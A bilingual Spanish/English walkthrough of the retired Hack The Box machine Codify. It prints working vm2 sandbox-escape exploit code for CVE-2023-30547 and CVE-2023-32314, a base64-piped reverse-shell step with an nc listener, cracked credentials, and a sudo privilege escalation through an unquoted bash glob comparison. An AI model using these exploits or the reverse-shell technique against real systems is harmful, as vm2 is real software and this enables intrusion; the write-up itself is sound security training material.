# Codify [EASY]

> **ES:** Máquina Linux Easy con playground Node.js (vm2 3.9.16) vulnerable a sandbox escape, SQLite con hash bcrypt y privesc vía script de backup con glob sin comillas.
> **EN:** Easy Linux machine with a Node.js playground (vm2 3.9.16) vulnerable to sandbox escape, SQLite with bcrypt hash and privesc via unquoted-glob backup script.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux (Ubuntu 22.04) |
| **Estado** | Retired (Release 2023-11-04 / Retire 2024-04-06) |
| **Maker** | kavigihan |
| **URL** | https://app.hackthebox.com/machines/Codify |
| **IP lab** | 10.10.11.239 |
| **Fecha de resolución** | 2024-03-14 (nota local) |

---

## Fuentes / Sources

- [IppSec: Codify (video)](https://youtube.com/watch?v=wH1Lp-sEVv4) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Escapar del sandbox vm2 → shell como `svc` → credencial `joshua` vía `tickets.db` → root vía `/opt/scripts/mysql-backup.sh`.
> **EN:** Escape vm2 sandbox → shell as `svc` → `joshua` credential via `tickets.db` → root via `/opt/scripts/mysql-backup.sh`.

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] gobuster / feroxbuster (paths, sin hallazgos nuevos)
- [ ] vm2 PoC CVE-2023-30547 / CVE-2023-32314
- [ ] pwncat-cs / nc (reverse shell)
- [ ] sqlite3, hashcat / john (`-m 3200` bcrypt)
- [ ] pspy (captura de `mysqldump -p...` en `ps`)

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** 3 puertos: 22 SSH, 80 Apache (reverse proxy) y 3000 Node/Express (misma app). El puerto 80 redirige a `codify.htb`.
> **EN:** 3 ports: 22 SSH, 80 Apache (reverse proxy) and 3000 Node/Express (same app). Port 80 redirects to `codify.htb`.

```bash
nmap -p- --min-rate 10000 10.10.11.239
nmap -p 22,80,3000 -sCV 10.10.11.239
echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:**
- `22/tcp OpenSSH 8.9p1 Ubuntu`, `80/tcp Apache 2.4.52 → http://codify.htb/`, `3000/tcp Node.js Express — Codify`.
- Cabeceras confirman proxy: en 80 aparece `Server: Apache` + `X-Powered-By: Express`; en 3000 solo Express, mismo `ETag`/contenido.
- Verificado en nota local + 0xdf (nmap idéntico).

### Paso 2 — Enumeración web / Web enumeration

> **ES:** App "Codify" para probar código Node.js. `/limitations` bloquea `child_process`/`fs`. `/about` delata `vm2 v3.9.16`. `/editor` ejecuta el código.
> **EN:** "Codify" app to test Node.js code. `/limitations` blocks `child_process`/`fs`. `/about` leaks `vm2 v3.9.16`. `/editor` runs the code.

**Resultado / Result:** vm2 3.9.16 es vulnerable a 4 RCE críticos (ver fuentes): CVE-2023-30547 (<3.9.17), CVE-2023-32314 (<3.9.18), CVE-2023-37466 y CVE-2023-37903 (<=3.9.19). La nota local ya apuntaba a CVE-2023-30547.

### Paso 3 — Acceso inicial, escape vm2 (foothold) / Initial access, vm2 escape

> **ES:** La nota local usa CVE-2023-30547 (Proxy + `getPrototypeOf` + stack overflow). 0xdf muestra que CVE-2023-32314 funciona sin modificar (`err.name.toString` con Proxy). Cualquiera vale; se usa uno para RCE y luego reverse shell.
> **EN:** Local note uses CVE-2023-30547 (Proxy + `getPrototypeOf` + stack overflow). 0xdf shows CVE-2023-32314 works unmodified (`err.name.toString` with Proxy). Any one works; use one for RCE then reverse shell.

```javascript
// CVE-2023-30547 (usado en nota local) — cambiar cmd por 'id' para ver salida
err = {};
const handler = {
  getPrototypeOf(target) {
    (function stack() { new Error().stack; stack(); })();
  }
};
const proxiedErr = new Proxy(err, handler);
try { throw proxiedErr; }
catch ({constructor: c}) {
  c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
```

```javascript
// CVE-2023-32314 (más directo según 0xdf) — ejecuta 'echo hacked' tal cual
const err = new Error();
err.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz, args) {
      const process = args.constructor.constructor("return process")();
      throw process.mainModule.require("child_process").execSync("echo hacked").toString();
    },
  }),
};
try { err.stack; } catch (stdout) { stdout; }
```

Reverse shell (base64 → bash) pegado en `/editor`:

```bash
# atacante
nc -lvnp 9999
# payload en editor (cmd): echo <base64 python3 revshell> | base64 -d | bash
```

**Resultado / Result:** Shell como `svc@codify`. Confirmado en nota local (pwncat `svc@codify:/home/svc$`) y 0xdf (`svc@codify:~$` vía `nc 443`).

### Paso 4 — Usuario joshua (user.txt) / User joshua

> **ES:** En `/var/www/contact/tickets.db` (SQLite, app Express en 3001 no expuesta) hay un hash bcrypt de `joshua`. Se crackea con rockyou.
> **EN:** In `/var/www/contact/tickets.db` (SQLite, Express app on 3001 not exposed) there is a bcrypt hash for `joshua`. Cracked with rockyou.

```bash
sqlite3 /var/www/contact/tickets.db ".tables"
sqlite3 /var/www/contact/tickets.db "SELECT id,username,password FROM users;"
# $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
hashcat -m 3200 joshua.hash /usr/share/wordlists/rockyou.txt
# o: john --format=bcrypt --wordlist=rockyou.txt hash.txt
ssh joshua@codify.htb
# joshua:spongebob1
cat ~/user.txt
```

**Resultado / Result:** Credencial `joshua:spongebob1` (verificada en nota local y 0xdf). Acceso SSH + `user.txt`.

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `joshua` puede correr `(root) /opt/scripts/mysql-backup.sh`. Dos fallos: comparativa sin comillas `[[ $DB_PASS == $USER_PASS ]]` (bypass con `*` y brute-force por glob) y password en línea de comandos visible con `pspy`.
> **EN:** `joshua` may run `(root) /opt/scripts/mysql-backup.sh`. Two flaws: unquoted compare `[[ $DB_PASS == $USER_PASS ]]` (bypass with `*` and glob brute-force) and command-line password visible via `pspy`.

```bash
sudo -l
cat /opt/scripts/mysql-backup.sh
# Bypass rápido + captura con pspy:
./pspy64 &
echo "*" | sudo /opt/scripts/mysql-backup.sh
# pspy muestra: /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p<ROOT_PASS> -e SHOW DATABASES;
# Brute-force por glob (nota local + 0xdf leak_password.py):
echo 'k*' | sudo /opt/scripts/mysql-backup.sh  # "Password confirmed!" = prefijo válido
su -  # password recuperado
cat /root/root.txt
```

**Resultado / Result:** Password de root recuperado (`kljh12k3jhaskjh12kjh3` en nota local; 0xdf obtiene el mismo valor vía pspy/brute-force). `su` → `root.txt`.
- Nota: la nota local incluye script python con typo `subproccess`; la versión corregida es la de 0xdf (`subprocess`, timeout 0.3s, charset `string.printable`).

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

- [ ] vm2 <=3.9.19 no es frontera de seguridad: 4 CVEs encadenables a RCE (30547, 32314, 37466, 37903).
- [ ] Apache como reverse proxy a Express: mismo contenido en 80/3000, distinto `Server` header.
- [ ] SQLite local + bcrypt (`-m 3200`) → reutilización SSH.
- [ ] Bash pitfall `[[ $a == $b ]]` sin comillas: glob `*` bypasea y permite oráculo carácter a carácter.
- [ ] Password en argv (`-p...`) se fuga vía `/proc`/pspy.

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Walkthrough de referencia:** [HTB: Codify — 0xdf](https://0xdf.gitlab.io/2024/04/06/htb-codify.html) — 0xdf (4 CVEs, proxy 80/3000, pspy + glob brute-force)
- **Nota local previa:** `Soluciones/Machines/unclasified/Codify/index.md` — randark/nota china (PoC CVE-2023-30547, tickets.db, `spongebob1`, mysql-backup.sh) — base en chino, aquí normalizada a ES/EN
- **Aviso de seguridad:** [GHSA-ch3r-j5x3-6q2m / CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m) — GitHub; [NVD CVE-2023-30547](https://nvd.nist.gov/vuln/detail/cve-2023-30547)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (síntesis propia a partir de las fuentes citadas)
- **Nota de migración:** este archivo normaliza `unclasified/Codify/index.md`. Pendiente mover carpeta a `Machines/Easy/Codify/` con `img/`.

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. Máquina retirada; flags ofuscadas en la redacción.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Retired machine; flags obfuscated in the write-up.

_Fecha de edición: 2026-09-24_
